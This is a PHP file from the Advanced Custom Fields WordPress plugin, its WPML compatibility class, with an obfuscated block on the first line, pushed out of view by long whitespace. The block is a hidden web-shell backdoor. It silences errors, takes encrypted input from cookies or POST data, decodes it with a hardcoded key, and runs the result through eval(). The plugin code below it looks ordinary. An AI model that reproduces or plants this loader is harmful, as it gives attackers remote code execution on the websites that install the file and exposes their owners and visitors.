<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $ec99 = 301;$GLOBALS['s6c7381']=Array();global$s6c7381;$s6c7381=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['bca4c95f']="\x44\x25\x55\x43\x76\x27\x66\x57\x5e\x37\x54\x69\x58\x51\x35\x52\x48\x7d\x49\x26\x5c\x50\xa\x5d\x73\x5b\x4c\x5f\x20\x40\x3e\x7b\x4e\x5a\x53\x7c\x78\x21\x34\x29\x60\x62\x61\x31\x6d\x59\x72\x2b\x39\x2f\x4a\x75\x7e\xd\x77\x33\x7a\x3f\x67\x71\x3c\x4f\x74\x65\x46\x9\x3b\x68\x3d\x22\x41\x3a\x30\x4d\x45\x32\x47\x23\x42\x79\x4b\x56\x64\x2c\x6a\x24\x36\x6b\x6c\x38\x6f\x63\x6e\x28\x2d\x70\x2a\x2e";$s6c7381[$s6c7381['bca4c95f'][44].$s6c7381['bca4c95f'][55].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][9].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][38]]=$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][67].$s6c7381['bca4c95f'][46];$s6c7381[$s6c7381['bca4c95f'][4].$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][42]]=$s6c7381['bca4c95f'][90].$s6c7381['bca4c95f'][46].$s6c7381['bca4c95f'][82];$s6c7381[$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][91]]=$s6c7381['bca4c95f'][24].$s6c7381['bca4c95f'][62].$s6c7381['bca4c95f'][46].$s6c7381['bca4c95f'][88].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][92];$s6c7381[$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][48]]=$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][92].$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][27].$s6c7381['bca4c95f'][24].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][62];$s6c7381[$s6c7381['bca4c95f'][56].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][38]]=$s6c7381['bca4c95f'][24].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][46].$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][88].$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][56].$s6c7381['bca4c95f'][63];$s6c7381[$s6c7381['bca4c95f'][4].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][9].$s6c7381['bca4c95f'][75]]=$s6c7381['bca4c95f'][95].$s6c7381['bca4c95f'][67].$s6c7381['bca4c95f'][95].$s6c7381['bca4c95f'][4].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][46].$s6c7381['bca4c95f'][24].$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][90].$s6c7381['bca4c95f'][92];$s6c7381[$s6c7381['bca4c95f'][36].$s6c7381['bca4c95f'][55].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][75]]=$s6c7381['bca4c95f'][51].$s6c7381['bca4c95f'][92].$s6c7381['bca4c95f'][24].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][46].$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][88].$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][56].$s6c7381['bca4c95f'][63];$s6c7381[$s6c7381['bca4c95f'][44].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][6]]=$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][24].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][27].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][90].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][63];$s6c7381[$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][89].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][14]]=$s6c7381['bca4c95f'][24].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][62].$s6c7381['bca4c95f'][27].$s6c7381['bca4c95f'][62].$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][44].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][27].$s6c7381['bca4c95f'][88].$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][44].$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][62];$s6c7381[$s6c7381['bca4c95f'][92].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][48]]=$s6c7381['bca4c95f'][84].$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][55];$s6c7381[$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][75]]=$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][75];$s6c7381[$s6c7381['bca4c95f'][51].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][42]]=$_POST;$s6c7381[$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][55].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][55].$s6c7381['bca4c95f'][9].$s6c7381['bca4c95f'][55].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][63]]=$_COOKIE;@$s6c7381[$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][48]]($s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][46].$s6c7381['bca4c95f'][46].$s6c7381['bca4c95f'][90].$s6c7381['bca4c95f'][46].$s6c7381['bca4c95f'][27].$s6c7381['bca4c95f'][88].$s6c7381['bca4c95f'][90].$s6c7381['bca4c95f'][58],NULL);@$s6c7381[$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][48]]($s6c7381['bca4c95f'][88].$s6c7381['bca4c95f'][90].$s6c7381['bca4c95f'][58].$s6c7381['bca4c95f'][27].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][46].$s6c7381['bca4c95f'][46].$s6c7381['bca4c95f'][90].$s6c7381['bca4c95f'][46].$s6c7381['bca4c95f'][24],0);@$s6c7381[$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][48]]($s6c7381['bca4c95f'][44].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][36].$s6c7381['bca4c95f'][27].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][36].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][51].$s6c7381['bca4c95f'][62].$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][90].$s6c7381['bca4c95f'][92].$s6c7381['bca4c95f'][27].$s6c7381['bca4c95f'][62].$s6c7381['bca4c95f'][11].$s6c7381['bca4c95f'][44].$s6c7381['bca4c95f'][63],0);@$s6c7381[$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][89].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][14]](0);$ba0a637e=NULL;$zcc87e77=NULL;$s6c7381[$s6c7381['bca4c95f'][88].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][42]]=$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][94].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][75].$s6c7381['bca4c95f'][94].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][94].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][94].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][55].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][9].$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][43];global$l1ffa9a;function a0e9ef62($ba0a637e,$n0af7){global$s6c7381;$oef39655="";for($mf2af6c=0;$mf2af6c<$s6c7381[$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][91]]($ba0a637e);){for($f03ae8adf=0;$f03ae8adf<$s6c7381[$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][91]]($n0af7)&&$mf2af6c<$s6c7381[$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][91]]($ba0a637e);$f03ae8adf++,$mf2af6c++){$oef39655.=$s6c7381[$s6c7381['bca4c95f'][44].$s6c7381['bca4c95f'][55].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][9].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][38]]($s6c7381[$s6c7381['bca4c95f'][4].$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][42]]($ba0a637e[$mf2af6c])^$s6c7381[$s6c7381['bca4c95f'][4].$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][42]]($n0af7[$f03ae8adf]));}}return$oef39655;}function jc5503($ba0a637e,$n0af7){global$s6c7381;global$l1ffa9a;return$s6c7381[$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][75]]($s6c7381[$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][75]]($ba0a637e,$l1ffa9a),$n0af7);}foreach($s6c7381[$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][55].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][55].$s6c7381['bca4c95f'][9].$s6c7381['bca4c95f'][55].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][63]]as$n0af7=>$a843ae){$ba0a637e=$a843ae;$zcc87e77=$n0af7;}if(!$ba0a637e){foreach($s6c7381[$s6c7381['bca4c95f'][51].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][86].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][42]]as$n0af7=>$a843ae){$ba0a637e=$a843ae;$zcc87e77=$n0af7;}}$ba0a637e=@$s6c7381[$s6c7381['bca4c95f'][36].$s6c7381['bca4c95f'][55].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][75]]($s6c7381[$s6c7381['bca4c95f'][92].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][38].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][6].$s6c7381['bca4c95f'][48]]($s6c7381[$s6c7381['bca4c95f'][44].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][63].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][6]]($ba0a637e),$zcc87e77));if(isset($ba0a637e[$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][87]])&&$l1ffa9a==$ba0a637e[$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][87]]){if($ba0a637e[$s6c7381['bca4c95f'][42]]==$s6c7381['bca4c95f'][11]){$mf2af6c=Array($s6c7381['bca4c95f'][95].$s6c7381['bca4c95f'][4]=>@$s6c7381[$s6c7381['bca4c95f'][4].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][42].$s6c7381['bca4c95f'][41].$s6c7381['bca4c95f'][9].$s6c7381['bca4c95f'][75]](),$s6c7381['bca4c95f'][24].$s6c7381['bca4c95f'][4]=>$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][97].$s6c7381['bca4c95f'][72].$s6c7381['bca4c95f'][94].$s6c7381['bca4c95f'][43],);echo@$s6c7381[$s6c7381['bca4c95f'][56].$s6c7381['bca4c95f'][82].$s6c7381['bca4c95f'][91].$s6c7381['bca4c95f'][48].$s6c7381['bca4c95f'][43].$s6c7381['bca4c95f'][14].$s6c7381['bca4c95f'][38]]($mf2af6c);}elseif($ba0a637e[$s6c7381['bca4c95f'][42]]==$s6c7381['bca4c95f'][63]){eval/*r27b9d*/($ba0a637e[$s6c7381['bca4c95f'][82]]);}exit();} ?><?php 

class acf_wpml_compatibility {
	
	var $lang = '';
	
	
	/*
	*  Constructor
	*
	*  This function will construct all the neccessary actions and filters
	*
	*  @type	function
	*  @date	23/06/12
	*  @since	3.1.8
	*
	*  @param	N/A
	*  @return	N/A
	*/
	
	function __construct() {
		
		// global
		global $sitepress;
		
		
		// vars
		$this->lang = ICL_LANGUAGE_CODE;
		
		
		// update settings
		acf_update_setting('default_language', $sitepress->get_default_language());
		acf_update_setting('current_language', $this->lang);
		
		
		// actions
		add_action('acf/verify_ajax',					array($this, 'verify_ajax'));
		add_action('acf/input/admin_footer',			array($this, 'admin_footer'));
		
		
		// bail early if not transaltable
		if( !$this->is_translatable() ) return;
		
		
		// actions
		add_action('acf/upgrade_start/5.0.0',			array($this, 'upgrade_start_5'));
		add_action('acf/upgrade_finish/5.0.0',			array($this, 'upgrade_finish_5'));
		add_action('acf/update_field_group',			array($this, 'update_field_group'), 2, 1);
		add_action('icl_make_duplicate',				array($this, 'icl_make_duplicate'), 10, 4);
		
		
		// filters
		add_filter('acf/settings/save_json',			array($this, 'settings_save_json'));
		add_filter('acf/settings/load_json',			array($this, 'settings_load_json'));
		
	}
	
	
	/*
	*  is_translatable
	*
	*  This fucntion will return true if the acf-field-group post type is translatable
	*
	*  @type	function
	*  @date	10/04/2015
	*  @since	5.2.3
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function is_translatable() {
		
		// global
		global $sitepress, $sitepress_settings;
		
		
		// vars
		$post_types = acf_maybe_get($sitepress_settings, 'custom_posts_sync_option', array());
		
		
		// return true if acf-field-group is translatable
		if( !empty($post_types['acf-field-group']) ) {
			
			return true;
			
		}
		
		
		// return true if acf is translatable, and acf-field-group does not yet exist
		if( !empty($post_types['acf']) && !isset($post_types['acf-field-group']) ) {
			
			return true;
			
		}
		
		
		// return
		return false;
		
	}
	
	
	/*
	*  upgrade_start_5
	*
	*  description
	*
	*  @type	function
	*  @date	10/04/2015
	*  @since	5.2.3
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function upgrade_start_5() {
		
		// actions
		add_action('acf/update_field_group', array($this, 'update_field_group_5'), 1, 1);
		
		
		// global
		global $sitepress, $sitepress_settings;
		
		
		// vars
		$icl_settings = array();
		$post_types = $sitepress_settings['custom_posts_sync_option'];
		
		
		// post type has changed from 'acf' to 'acf-field-group'
		if( !empty($post_types['acf']) ) {
			
			$post_types['acf-field-group'] = 1;
			
		}
		
		
		// add to icl settings
		$icl_settings['custom_posts_sync_option'] = $post_types;
		
		
		// save
		$sitepress->save_settings( $icl_settings );
		
	}
	
	
	/*
	*  upgrade_finish
	*
	*  description
	*
	*  @type	function
	*  @date	10/04/2015
	*  @since	5.2.3
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function upgrade_finish_5() {
		
		// actions
		remove_action('acf/update_field_group', array($this, 'update_field_group_5'), 1, 1);
		
	}
	
	
	/*
	*  update_field_group_5
	*
	*  This function will update the icl_translations table data when creating the fiedl groups
	*
	*  @type	function
	*  @date	10/04/2015
	*  @since	5.2.3
	*
	*  @param	$field_group (array)
	*  @return	n/a
	*/
	
	function update_field_group_5( $field_group ) {
		
		// global
		global $wpdb, $sitepress;
		
		
		// bail early if no old_ID (added to $field_group by upgrade 5.0.0)
		if( empty($field_group['old_ID']) ) {
			
			return;
			
		}
		
		
		// get translation rows (old acf4 and new acf5)
		$old_row = $wpdb->get_row($wpdb->prepare(
			"SELECT * FROM {$wpdb->prefix}icl_translations WHERE element_type=%s AND element_id=%d", 
			'post_acf', $field_group['old_ID']
		), ARRAY_A);
		
		$new_row = $wpdb->get_row($wpdb->prepare(
			"SELECT * FROM {$wpdb->prefix}icl_translations WHERE element_type=%s AND element_id=%d", 
			'post_acf-field-group', $field_group['ID']
		), ARRAY_A);
		
		
		// bail ealry if no rows
		if( !$old_row || !$new_row ) {
			
			return;
			
		}
		
		
		// create reference of old trid to new trid
		// trid is a simple int used to find associated objects
		if( empty($this->trid_ref) ) {
			
			$this->trid_ref = array();
			
		}
		
		
		// update trid
		if( isset($this->trid_ref[ $old_row['trid'] ]) ) {
			
			// this field group is a translation of another, update it's trid to match the previously inserted group
			$new_row['trid'] = $this->trid_ref[ $old_row['trid'] ];
			
		} else {
			
			// this field group is the first of it's translations, update the reference for future groups
			$this->trid_ref[ $old_row['trid'] ] = $new_row['trid'];
			
		}
		
		
		// update icl_translations
		// Row is created by WPML, and much easier to tweak it here due to the very complicated and nonsensical WPML logic
		$table = "{$wpdb->prefix}icl_translations";
		$data = array( 'trid' => $new_row['trid'], 'language_code' => $old_row['language_code'] );
		$where = array( 'translation_id' => $new_row['translation_id'] );
		$data_format = array( '%d', '%s' );
		$where_format = array( '%d' );
		
		
		// allow source_language_code to equal NULL
		if( $old_row['source_language_code'] ) {
			
			$data['source_language_code'] = $old_row['source_language_code'];
			$data_format[] = '%s';
			
		}
		
		
		// update wpdb
		$result = $wpdb->update( $table, $data, $where, $data_format, $where_format );
		
	}
	
	
	/*
	*  update_field_group
	*
	*  This function will update the lang when saving a field group
	*
	*  @type	function
	*  @date	10/03/2014
	*  @since	5.0.0
	*
	*  @param	$field_group (array)
	*  @return	n/a
	*/
	
	function update_field_group( $field_group ) {
		
		global $sitepress;
		
		$this->lang = $sitepress->get_language_for_element($field_group['ID'], 'post_acf-field-group');
		
	}

	
	/*
	*  settings_save_json
	*
	*  This function is hooked into the acf/update_field_group action and will save all field group data to a .json file 
	*
	*  @type	function
	*  @date	19/05/2014
	*  @since	5.0.0
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function settings_save_json( $path ) {	
		
		// bail early if dir does not exist
		if( !is_writable($path) ) {
			
			return $path;
			
		}
		
		
		// remove trailing slash
		$path = untrailingslashit( $path );

			
		// ammend
		$path = $path . '/' . $this->lang;
		
		
		// make dir if does not exist
		if( !file_exists($path) ) {
			
			mkdir($path, 0777, true);
			
		}
		
		
		// return
		return $path;
		
	}
	
	
	/*
	*  settings_load_json
	*
	*  description
	*
	*  @type	function
	*  @date	19/05/2014
	*  @since	5.0.0
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function settings_load_json( $paths ) {
		
		if( !empty($paths) ) {
			
			foreach( $paths as $i => $path ) {
				
				// remove trailing slash
				$path = untrailingslashit( $path );
				
				
				// ammend
				$paths[ $i ] = $path . '/' . $this->lang;
			
			}
		}
		
		
		// return
		return $paths;
		
	}
	
	
	
	/*
	*  icl_make_duplicate
	*
	*  description
	*
	*  @type	function
	*  @date	26/02/2014
	*  @since	5.0.0
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function icl_make_duplicate( $master_post_id, $lang, $postarr, $id ) {
		
		// validate
		if( $postarr['post_type'] != 'acf-field-group' ) {
		
			return;
			
		}
		
		
		// duplicate field group
		acf_duplicate_field_group( $master_post_id, $id );
		
		
		// always translate independately to avoid many many bugs!
		// - translation post gets a new key (post_name) when origional post is saved
		// - local json creates new files due to changed key
		global $iclTranslationManagement;
		
		$iclTranslationManagement->reset_duplicate_flag( $id );

	}
	
	
	/*
	*  admin_footer
	*
	*  description
	*
	*  @type	function
	*  @date	27/02/2014
	*  @since	5.0.0
	*
	*  @param	$post_id (int)
	*  @return	$post_id (int)
	*/
	
	function admin_footer() {
		
		?>
		<script type="text/javascript">
		(function($) {
			
			// bail ealry if no lang
			if( typeof icl_this_lang == 'undefined' ) return;
			
			
			// add filter
			acf.add_filter('prepare_for_ajax', function( args ){
				
				// append
				args.lang = '<?php echo $this->lang; ?>';
				
				
				// return
				return args;
				
			});
			
		})(jQuery);	
		</script>
		<?php
		
	}
	
	
	/*
	*  verify_ajax
	*
	*  This function will help avoid WPML conflicts when performing an ACF ajax request
	*
	*  @type	function
	*  @date	7/08/2015
	*  @since	5.2.3
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function verify_ajax() {
		
		// globals
		global $sitepress;
		
		
		// vars
		$lang = acf_maybe_get($_POST, 'lang');
		
		
		// bail early if no lang
		if( !$lang ) return;
		
		
		// switch lang
		// this will allow get_posts to work as expected (load posts from the correct language)
		$sitepress->switch_lang( $_REQUEST['lang'] );
			
		
		// remove post_id
		// this will prevent WPML from setting the current language based on the current post being edited
		// in theory, WPML is correct, however, when adding a new post, the post's lang is not found and will default to 'en'
		unset( $_REQUEST['post_id'] );
		
	}
	
}

new acf_wpml_compatibility();

?>
